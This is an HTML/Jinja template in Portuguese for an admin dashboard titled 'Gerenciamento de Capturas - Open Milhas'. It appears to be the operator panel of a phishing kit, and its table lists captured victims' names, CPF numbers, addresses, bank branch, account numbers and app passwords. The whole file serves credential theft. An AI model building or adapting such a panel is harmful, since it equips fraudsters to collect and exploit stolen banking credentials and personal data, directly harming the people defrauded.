<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel de Controle | Admin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f4f7f6; padding: 20px; }
        .card-admin { background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); padding: 20px; }
        .table thead { background: #0a1128; color: white; }
        .badge-danger { background: #dc3545; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="card-admin">
            <h2 class="mb-4">Gerenciamento de Capturas - Open Milhas</h2>
            <div class="table-responsive">
                <table class="table table-hover table-striped">
                    <thead>
                        <tr>
                            <th>ID</th><th>Nome / CPF</th><th>Endereço</th><th>Agência</th><th>Conta</th><th>Senha App</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for user in usuarios %}
                        <tr>
                            <td>{{ user[0] }}</td>
                            <td><b>{{ user[1] }}</b><br><small>{{ user[3] }}</small></td>
                            <td>{{ user[5] }}, {{ user[6] }} ({{ user[4] }})</td>
                            <td>{{ user[7] }}</td>
                            <td>{{ user[8] }}</td>
                            <td><span class="badge-danger">{{ user[9] }}</span></td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
